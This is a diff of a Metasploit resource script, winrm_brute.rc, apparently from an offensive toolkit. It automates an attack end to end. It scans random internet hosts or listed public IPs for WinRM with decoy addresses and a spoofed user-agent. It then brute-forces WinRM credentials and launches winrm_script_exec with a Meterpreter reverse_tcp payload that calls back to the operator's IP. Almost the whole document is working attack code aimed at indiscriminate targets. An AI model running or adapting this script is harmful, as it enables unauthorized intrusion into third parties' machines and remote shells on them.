@@ -1,31 +1,38 @@
-   <ruby>
-      run_single("workspace -a redteam")
+##
+# Script: winrm_brute.rc
+# Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+# GitHub: https://github.com/r00t-3xp10it/resource_files
+# -
+# [OPTIONS]
+# setg INTERFACE wlan0 - Set local network interface in use.
+# setg SAVE_DB true - Save workspace mosquito to database.xml
+# setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
+# setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
+# setg PAYLOAD windows/meterpreter/reverse_tcp - Payload to use in exploitation function
+# setg RHOSTS 203.137.119.98 154.208.147.160 205.65.133.91 - To instruct db_nmap to scan hosts for ports open.
+# setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
+# -
+# [SYNTAX EXAMPLES]
+# msf5 > setg RANDOM_HOSTS true;resource /root/winrm_brute.rc'
+# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/winrm_brute.rc
+##
+  <ruby>
+      run_single("workspace -a mosquito")
       help = %Q|
+                                                🦟__________       
+              _______🦟________________________  ___(_) _  /______🦟
+           __  __  __ \\  __ \\_  ___/  __  /  / / /_  /_  __/  __ \\
+         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           /_/ /_/ /_/\\____//____/ \\__, / \\__,_/ /_/  \\__/ \\____/
+                                  🦟 /_/                       🦟
 
-        Description:
-          setg SAVE_DB true - Save workspace redteam to database.xml
-          setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
-          setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
-          setg RHOSTS 154.208.147.160 71.190.221.109 - To instruct db_nmap to scan hosts for ports open.
-          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
-          winrm_brute.rc will use nmap to populate the msfdb database with remote hosts address then it
-          triggers msf auxiliary/scanners based on host(s) open port(s) and service name discovery.
-          This module probes for 80:5985 remote TCP ports in open state.
+    Script: winrm_brute.rc
+    Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+    GitHub: https://github.com/r00t-3xp10it/resource_files
 
-        Execute in msfconsole:
-          setg SAVE_DB <true-or-blank>
-          setg LIMMIT <number-of-rhosts>
-          setg RANDOM_HOSTS <true-or-blank>
-          setg RHOSTS <hosts-separated-by-spaces>
-          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
-          resource <path-to-script>/winrm_brute.rc
-
-        Author:
-          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
       |
       print_line(help)
       Rex::sleep(1.5)
-      print_line("")
 
 
       ## Make sure we are connected to db
@@ -37,10 +44,18 @@
       else
         print_good("Database connected to postgresql.")
         Rex::sleep(0.5)
-        work_name = framework.db.workspace.name
         local = Dir.pwd
+        work_name = framework.db.workspace.name
         print_status("Working in workspace: *#{work_name}")
         Rex::sleep(1.0)
+        ip_range = File.read("ip_range.txt") if File.exist?("ip_range.txt")
+      end
+
+      ## Sellect local network interface
+      unless (framework.datastore['INTERFACE'] == nil or framework.datastore['INTERFACE'] == '')
+        inter = "#{framework.datastore['INTERFACE']}"
+      else
+        inter = "wlan0"
       end
 
       ## Sellect the type of nmap scan to use
@@ -53,30 +68,33 @@
            print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
          end
       elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
-         run_single("setg RHOSTS 192.168.1.0/24")
+         run_single("setg RHOSTS #{ip_range}.0/24")
       elsif (framework.datastore['RHOSTS'])
          print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
       end
 
       ## Metasploit auxiliarys brute force dicionary absoluct path
       if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
-         # setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
-         run_single("setg USERPASS_FILE #{local}/bin/multi_services_wordlist.txt")
+         run_single("setg USERPASS_FILE #{local}/bin/wordlists/multi_services_wordlist.txt")
       else
          print_line("USERPASS_FILE => #{framework.datastore['USERPASS_FILE']}")
       end
 
       ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
       # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
-      unless (framework.datastore['RANDOM_HOSTS'] == "true")
-         run_single("db_nmap -sV -Pn -T4 -O -p 80,5985 --open --script=http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+      if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 5985 --open --script=banner.nse,http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+      elsif (framework.datastore['RANDOM_HOSTS'] == "true")
+         print_status("Nmap: search for random remote hosts with ports 5985 open")
+         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 5985 --open --script=banner.nse,http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
       else
-         print_good("Nmap: search for random remote hosts with ports 80:5985 open")
-         run_single("db_nmap -sV -Pn -T5 -O -iR #{framework.datastore['LIMMIT']} -p 80,5985 --open --script=http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\"")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 5985 --open --script=banner.nse,http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
       end
 
-      ## Read the database 
-      run_single("spool #{local}/logs/winrm_brute.log")
+      ## Read the database
+      if File.directory?("#{local}/logs")
+         run_single("spool #{local}/logs/winrm_brute.log")
+      end
       print_line("")
       run_single("services")
       print_good("Sellecting target hosts from msf database.")
@@ -84,7 +102,6 @@
       xport = framework.db.services.map(&:port).join(' ')
       proto = framework.db.services.map(&:proto).join(' ')
       xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
-      print_status("Target systems detected: #{xname}")
       run_single("setg RHOSTS #{xhost}")
       Rex::sleep(2.0)
 
@@ -94,16 +111,14 @@
               print_error("please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
-              File.delete('#{local}/logs/winrm_brute.log')
-              run_single("workspace -d redteam")
+              run_single("workspace -d mosquito")
               return nil
          elsif xport.nil? or xport == '' or xport == ' '
-              print_error("[ERROR] db_nmap did not find any 80:5985 open ports.")
+              print_error("[ERROR] db_nmap did not find any 5985 open ports.")
               print_error("please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
-              File.delete('#{local}/logs/winrm_brute.log')
-              run_single("workspace -d redteam")
+              run_single("workspace -d mosquito")
               return nil
          end
 
@@ -125,21 +140,52 @@
            print_error("Please wait, cleaning recent configurations.")
            Rex::sleep(1.0)
             run_single("unsetg all")
-            File.delete('#{local}/logs/winrm_brute.log')
-            run_single("workspace -d redteam")
+            run_single("workspace -d mosquito")
             return nil
          end
+
+      ## Make sure that freevulnseach.nse exists
+      Rex::sleep(2.0)
+      unless (File.exist?(nse))
+           print_error("[ERROR] freevulnsearch.nse/vulners.nse script(s) not found in nmap db.")
+           print_error("[ERROR] Download nse script(s) and install it before running this rc file.")
+           Rex::sleep(1.0)
+           nof = %Q|
+
+    How To Fix
+    ----------
+    Exit current session and msfconsole < exit AND exit -y >
+    Then execute the follow commands in a new terminal windows:
+
+    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
+    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
+    sudo nmap --script-updatedb
+
+    sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
+    sudo cp vulners.nse /usr/share/nmap/scripts/vulners.nse
+    sudo nmap --script-updatedb
+
+           |
+           print_line(nof)
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           run_single("unsetg all")
+           run_single("workspace -d mosquito")
+           return nil
+      else
+           print_good("freevulnsearch.nse/vulners.nse script(s) found.")
+      end
 
 
          ## Run gather/brute-force modules
          if xport =~ /5985/ or proto =~ /(winrm|wsman|wsmans)/i
-            com = `ifconfig wlan0 | grep -w 'inet' | awk {'print $2'}`
-              print_warning("Remote Target port 5985 winrm found.")
+            com = `ifconfig #{inter} | grep -w 'inet' | awk {'print $2'}`
+              print_warning("Remote Target port: 5985 winrm found.")
               Rex::sleep(1.0)
               run_single("use auxiliary/scanner/winrm/winrm_auth_methods")
               run_single("set THREADS 10")
               print_line("")
-              run_single("services -c name -S winrm -R")
+              run_single("services -c port -S 5985 -R")
               run_single("exploit")
               Rex::sleep(1.5)
               run_single("use auxiliary/scanner/winrm/winrm_login")
@@ -148,58 +194,61 @@
               run_single("set VERBOSE true")
               run_single("set THREADS 10")
               print_line("")
-              run_single("services -c name -S winrm -R")
+              run_single("services -c port -S 5985 -R")
               run_single("exploit")
               Rex::sleep(1.5)
-
-                 ## User Inputs (username|password)
-                 print "[+] Input Remote winrm USERNAME: "
-                 user_name = gets.chomp
-                 if user_name.nil? or user_name == '' or user_name == ' '
-                    user_name = "Administrator"
+              ## Try to exploit remote targets
+              print "[ ] Exploit winrm service (y|n)? "
+                 question = gets.chomp
+                 if question == "y" or question == "Y" or question == "yes" or question == "YES"
+                    ## User Inputs (username|password)
+                    print "[+] Input Remote winrm USERNAME: "
+                    user_name = gets.chomp
+                    if user_name.nil? or user_name == '' or user_name == ' '
+                       user_name = "Administrator"
+                    end
+                    print "[+] Input Remote winrm PASSWORD: "
+                    user_pass = gets.chomp
+                    if user_pass.nil? or user_pass == '' or user_pass == ' '
+                       user_pass = "Administrator"
+                    end
+                    run_single("use exploit/windows/winrm/winrm_script_exec")
+                    run_single("set USERNAME #{user_name}")
+                    run_single("set PASSWORD #{user_pass}")
+                    run_single("set VERBOSE true")
+                    run_single("set THREADS 10")
+                    run_single("set LHOST #{com}")
+                    run_single("set LPORT 443")
+                    run_single("set PAYLOAD #{framework.datastore['PAYLOAD']}")
+                    print_line("")
+                    run_single("services -c port -S 5985 -R")
+                    run_single("exploit")
+                    Rex::sleep(1.5)
                  end
-                 print "[+] Input Remote winrm PASSWORD: "
-                 user_pass = gets.chomp
-                 if user_pass.nil? or user_pass == '' or user_pass == ' '
-                    user_pass = "Administrator"
-                 end
-
-              run_single("use exploit/windows/winrm/winrm_script_exec")
-              run_single("set USERNAME #{user_name}")
-              run_single("set PASSWORD #{user_pass}")
-              run_single("set VERBOSE true")
-              run_single("set THREADS 10")
-              run_single("set LHOST #{com}")
-              run_single("set LPORT 443")
-              run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
-              print_line("")
-              run_single("services -c name -S winrm -R")
-              run_single("exploit")
-              Rex::sleep(1.5)
          end
 
-         if xport =~ /80/ or proto =~ /http/i
-              print_warning("Remote Target port: 80 http found")
-              Rex::sleep(1.0)
-              run_single("use auxiliary/scanner/http/title")
-              print_line("")
-              run_single("services -c name -S http -R")
-              run_single("exploit")
-              run_single("use auxiliary/scanner/http/options")
-              run_single("set THREADS 11")
-              print_line("")
-              run_single("services -c name -S http -R")
-              run_single("exploit")
-              run_single("use auxiliary/scanner/http/dir_scanner")
-              run_single("exploit")
-              run_single("use auxiliary/scanner/http/http_login")
-              run_single("set STOP_ON_SUCCESS true")
-              run_single("set THREADS 16")
-              print_line("")
-              run_single("services -c name -S http -R")
-              run_single("exploit")
-         end
+         ## Running freevulnsearch.nse (scan for CVE's)
+         print "[+] Scan for possible CVE's? (y/n): "
+            question = gets.chomp
 
+         if question == "y" or question == "Y"
+            displ = %Q|
+
+         MMMMMMMMMMM'""""'YMMM  MM""MMMMM""MM  MM""""""""`MMMMMMMMMM
+         MMMMMMMMMM' .mmm. `MM  MM  MMMMM  MM  MM  mmmmmmmMMMMMMMMMM
+         MMMMMMMMMM  MMMMMooMM  MM  MMMMP  MM  MM`      MMMMMMMMMMMM 
+         MMMMMMMMMM  MMMMMMMMM  MM  MMMM' .MM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMM. `MMM' .MM  MM  MMP' .MMM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMMM.     .dMM  MM     .dMMMM  MM        .MMMMMMd@bM 
+         MMMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMMM
+                    freevulnsearch.nse by: Mathias Gut
+                         vulners.nse by: gmedian
+
+            |
+            print_line(displ)
+            print_warning("Running CVE checks againts: #{framework.datastore['RHOSTS']}")
+            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse,vulners.nse #{framework.datastore['RHOSTS']}")
+         end
 
       ## Save current database to local file (database.xml)
       if (framework.datastore['SAVE_DB'] == "true")
@@ -213,10 +262,15 @@
       Rex::sleep(1.5)
       run_single("unsetg all")
       run_single("unset all")
-      run_single("workspace -d redteam")
-      run_single("back")
+      run_single("workspace -d mosquito")
 
-      print_warning("Logfile stored under: #{local}/logs/winrm_brute.log")
-      print_warning("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
+      dtr = `date`
+      ## Writting ['xhost(s)'] to mosquito logfile
+      if File.directory?("#{local}/logs")
+         print_warning("Session Logfile stored under: #{local}/logs/winrm_brute.log")
+         run_single("echo \"[#{dtr}] winrm_brute: #{xhost}\" >> logs/mosquito.log")
+      end
+      File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+      run_single("back")
    </ruby>
 
